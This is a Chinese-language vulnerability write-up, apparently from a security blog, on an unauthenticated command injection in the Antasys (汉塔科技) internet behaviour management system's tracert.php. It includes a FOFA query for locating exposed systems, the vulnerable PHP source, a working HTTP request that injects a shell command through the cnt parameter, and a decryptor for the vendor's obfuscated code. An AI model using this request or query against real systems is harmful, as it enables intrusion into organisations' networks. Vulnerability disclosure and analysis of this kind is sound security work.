---
title: "汉塔科技上网行为管理系统 tracert.php 命令注入漏洞"
source: https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html
asset_dir: assets/汉塔科技上网行为管理系统-tracert.php-命令注入漏洞
---

# 汉塔科技上网行为管理系统 tracert.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/30 08:37
- 1204浏览
- [0评论](#comment)
- 51分钟阅读

深入探索

软件

软件开发

服务器

---

# 漏洞简介

汉塔科技 - 上网行为管理系统是上海汉塔网络科技有限公司开发的一款上网行为流量管理系统。其系统 `tracert.php` 存在[命令注入](https://mrxn.net/tag/rce)漏洞，未授权攻击者可利用此漏洞在服务器上[执行](https://mrxn.net/tag/rce)任意系统命令，造成系统失陷、敏感数据泄露等高危风险。

网络监控与管理

# 影响版本

# fofa语法

> `body="Antasys"`

# 漏洞分析

> 系统比较古老，使用的是威盾PHP混淆加密，可以参考附录部分代码进行批量解密或者使用参考链接部分进行在线单个文件解密。

直接看 `dgn/dgn_tools/tracert.php` 的业务逻辑实现关键部分

深入探索

恶意软件分析工具

SQL注入防护

安全运维咨询

```
<?php

ini_set('display_errors', 1);
error_reporting(E_ALL ^ E_NOTICE);
$trace_ip_addr = $_REQUEST['ipdm'];
$maxhops = $_REQUEST['cnt'];
if (get_magic_quotes_gpc()) {
    $trace_ip_addr = stripslashes($trace_ip_addr);
}
if (strlen($trace_ip_addr) <= 50) {
    if (1) {
        echo '<pre>' . "\n" .
            'traceroute ' . $trace_ip_addr . "<br>";
        system('traceroute ' . $trace_ip_addr . ' -m ' . $maxhops);
        echo '</pre>' . "\n" .
            '<p>Trace complete.</p>' . "\n";
    } else {
        echo '<p>Please enter a valid IP address.</p>' . "<br>";
    }
} else {
    echo '<p>An illegal operation was encountered.</p>' . "<br>";
}
?>
```

通过 `$_REQUEST` 超全局变量获取 `ipdm` 和 `cnt` 参数值后，对前者使用 `get_magic_quotes_gpc()` 对获取的 `$trace_ip_addr` 进行单双引号反斜杠以及null字符进行转义（添加反斜杠），命令注入时需要注意。其次是判断 `$trace_ip_addr` 的长度小于等于50就直接拼接进 system函数进行[命令执行](https://mrxn.net/tag/rce)，无任何过滤，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
GET /dgn/dgn_tools/tracert.php?cnt=1;set;&ipdm=127.0.0.1 HTTP/1.1
Host: antasys.test
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
```

深入探索

文件大小转换

服务器安全服务

SQL注入检测工具

两个参数均存在命令注入

代码安全审计

[![汉塔科技上网行为管理系统 tracert.php 命令注入漏洞](images/img-001-7f3f76f2339b.webp)](https://image.mrxn.net/2e6e1ae43cab4258a5e579498daf0c43.webp)

[![汉塔科技上网行为管理系统 tracert.php 命令注入漏洞](images/img-002-e2eff19e6455.webp)](https://image.mrxn.net/5a861560f42e4ad88b6530fb06aa9353.webp)

成功执行命令并回显结果。

漏洞预警服务

# 附录

威盾PHP解密，批量解密： `https://gist.github.com/Mr-xn/2c749d160cb4b7460b504c9cf0376ec6`

```
<?php
/***********************************
 *威盾PHP加密专家解密算法 By：zhrt
 *http://www.oicto.com
 *2013.12.31
 *把该程序放到网站程序的目录下，即可针对文件所在目录及子目录的文件进行破解，源加密文件被更改名为.bak.php.
 ***********************************/

//decode("Image.class.php");

function explorerdir($dir)
{
    $dp=opendir($dir); //打开目录句柄
    //echo " ".$dir."\r\n"; //输出目录
    while ($file = readdir($dp)) //遍历目录
    {
        if ($file !='.'&&$file !='..') //如果文件不是当前目录及父目录
        {
            $path=$dir.DIRECTORY_SEPARATOR.$file; //获取路径
            if(is_dir($path)) //如果当前文件为目录
            {
                explorerdir($path);   //递归调用
            }
            else   //如果不是目录
            {

                //echo "-".$path."\n"; //输出文件名

                echo decode($path);

            }
        }
    }
    closedir($dp);    //关闭文件名柄

}
explorerdir(".");    //调用当前目录

function decode($filename="")
{

    if(pathinfo($filename, PATHINFO_EXTENSION)!="php" || strpos($filename,".bak.php") || realpath($filename) == __FILE__ ){return;}

    //$filename="intro.class.php";//要解密的文件

    if(!file_exists($filename))
    {
        exit("file is not exist;");

    }

    $lines = file($filename);//0,1,2行

    //第一次base64解密
    $content="";
    if(preg_match("/O0O0000O0\('.*'\)/",$lines[1],$y))
    {
        $content=str_replace("O0O0000O0('","",$y[0]);
        $content=str_replace("')","",$content);
        $content=base64_decode($content);
    }
    else
    {
        weidun_log(false,realpath($filename)." is not Encrypted!");
        return false;

    }
    //第一次base64解密后的内容中查找密钥
    $decode_key="";
    if(preg_match("/\),'.*',/",$content,$k))
    {
        $decode_key=str_replace("),'","",$k[0]);
        $decode_key=str_replace("',","",$decode_key);
    }
    //查找要截取字符串长度
    $str_length="";
    if(preg_match("/,\d*\),/",$content,$k))
    {
        $str_length=str_replace("),","",$k[0]);
        $str_length=str_replace(",","",$str_length);
    }
    //截取文件加密后的密文
    $Secret=substr($lines[2],$str_length);
    //echo $Secret;

    //直接还原密文输出
    echo "<!-- <?php\n".base64_decode(strtr($Secret,$decode_key,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))."?> -->"; //很奇怪，去掉这行，下面的代码就出现问题，可能跟编码有关，在这里我就暂时不做进一步分析了，注视掉避免界面缭乱。
    //echo "解密中....\<br>";
    $filecontent = "<?php\n".base64_decode(strtr($Secret,$decode_key,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))."?>";
    //echo $filecontent;
    $filenamebak = str_replace(".php",".bak.php",$filename);

    if(!file_exists($filenamebak)){

        if(rename($filename,$filenamebak))
        {

            if(!file_exists($filename) && file_exists($filenamebak))//文件被更改成功
            {

                $fp = fopen($filename,"w");
                fwrite($fp,$filecontent);
                fclose($fp);

            }

        }

    }else{

        //return("备份文件".$filenamebak."已存在，停止解密。");
        weidun_log(false,realpath($filenamebak)." is exist!");
        return false;

    }
    weidun_log(true,realpath($filename)." - successful!");
    return $filename." - successful! \n";

}

function weidun_log($s = true,$c ="")
{

    if($s)
    {
        $fp = fopen("./log.txt","a+");
        fwrite($fp,$c."\n");
        fclose($fp);
    }
    else
    {
        $fp = fopen("./log_error.txt","a+");
        fwrite($fp,$c."\n");
        fclose($fp);
    }

}
?>
```

在线单个文件解密：`https://yoursunny.com/p/PHP-decode/`

PS： 最近刚好在公众号看到有人去蛐蛐漏洞提交者的，啥心态啊， 这些洞真不是啥不得了的大洞。

网络安全

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.附录](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

计算机安全
